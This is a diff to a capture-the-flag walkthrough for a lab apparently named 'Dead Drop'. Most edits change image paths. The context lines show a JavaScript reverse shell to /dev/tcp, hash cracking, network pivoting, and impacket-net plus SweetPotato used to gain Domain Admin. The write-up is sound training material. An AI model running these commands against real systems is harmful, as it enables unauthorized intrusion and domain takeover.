@@ -6,7 +6,7 @@ difficulty: "Medium"
 ---
 # Room link: https://tryhackme.com/room/dead-drop
 
-![](../Attachments/Pasted%20image%2020260923031043.png)
+![](Labs/Attachments/Pasted%20image%2020260923031043.png)
 
 ![](Pasted%20image%2020260920171812.png)
 
@@ -43,15 +43,15 @@ I'm logged in as `admin` and it looks like a file upload page.
  
  I created a `PHP reverse shell` from `revshells.com` and tried to upload it. 
 
-![](../Attachments/Pasted%20image%2020260921140510.png)
+![](Labs/Attachments/Pasted%20image%2020260921140510.png)
 
 The problem is that I can't find the exact path of it. I tried authenticated fuzzing using the `connect.sid` cookie but did not find anything.
 
-![](../Attachments/Pasted%20image%2020260921140603.png)
+![](Labs/Attachments/Pasted%20image%2020260921140603.png)
 
 Wappalyzer shows that this website's backend is `Node.js`, so instead of `PHP`, I will use a `javascript reverse shell`.
 
-![](../Attachments/Pasted%20image%2020260921140709.png)
+![](Labs/Attachments/Pasted%20image%2020260921140709.png)
 
 Setup a listener on my `attack machine`.
 
@@ -71,7 +71,7 @@ require('child_process').exec('bash -c "bash -i >& /dev/tcp/192.168.21.31/9001 0
 
 Once Uploaded, I click the `preview` functionality on the website.
 
-![](../Attachments/Pasted%20image%2020260921142640.png)
+![](Labs/Attachments/Pasted%20image%2020260921142640.png)
 
 After that, I got shell access.
 
@@ -165,7 +165,7 @@ Look at the `$` prefix:
 
 It is important to identify what type of hash it is because we need to get the `hashcat mode ID` for it to work.
 
-![](../Attachments/Pasted%20image%2020260921144108.png)
+![](Labs/Attachments/Pasted%20image%2020260921144108.png)
 
 ```bash
 $ unshadow svcpasswd svcshadow > shadow.hash
@@ -245,11 +245,11 @@ Archive:  deaddrop-mobile.apk
 
 It's too crazy for me to scrub this through strings so I used a program called `JADX` and open the `APK` file there.
 
-![](../Attachments/Pasted%20image%2020260921161411.png)
+![](Labs/Attachments/Pasted%20image%2020260921161411.png)
 
 Research says `com` is where the `App's logic`, `Package Heirarchy` located.
 
-![](../Attachments/Pasted%20image%2020260921162659.png)
+![](Labs/Attachments/Pasted%20image%2020260921162659.png)
 
 I understand they are in the same subnet but I want to make sure I have a clean path towards the internal hosts. I setup `ligolo-ng`. 
 
@@ -361,7 +361,7 @@ INFO: Done in 01M 24S
 
 ##### Bloodhound 
 
-![](../Attachments/Pasted%20image%2020260921175219.png)
+![](Labs/Attachments/Pasted%20image%2020260921175219.png)
 
 `J.HARRIS` can add any member to these groups. That's crazy because I can basically create a user and add it as `Domain Admins` or add `J.HARRIS` if it's not part of it yet. The only problem is I need to get shell access on it. 
 
@@ -535,11 +535,11 @@ I tried to use `j.harris` credentials to `evil-winrm` and `RDP` but no luck. I'm
 
 `IMPACKET-NET`
 
-![](../Attachments/Pasted%20image%2020260923013825.png)
+![](Labs/Attachments/Pasted%20image%2020260923013825.png)
 
 On this page, it breaks down how to do every step and this one is what I needed.
 
-![](../Attachments/Pasted%20image%2020260923013958.png)
+![](Labs/Attachments/Pasted%20image%2020260923013958.png)
 
 ```bash
 $ impacket-net deaddrop.loc/j.harris:'{REDACTED}'@192.168.11.100 group -name "Domain Admins" -join j.harris
@@ -607,7 +607,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 
 I got `DC MACHINE ACCOUNT` using `SweetPotate.exe` because of the `SeImpersonatePrivilege`. This allowed me to browse `Administrator` directory and get the flag.
 
-![](../Attachments/Pasted%20image%2020260923015142.png)
+![](Labs/Attachments/Pasted%20image%2020260923015142.png)
 
 ```powershell
 C:\Users\Administrator\Desktop>
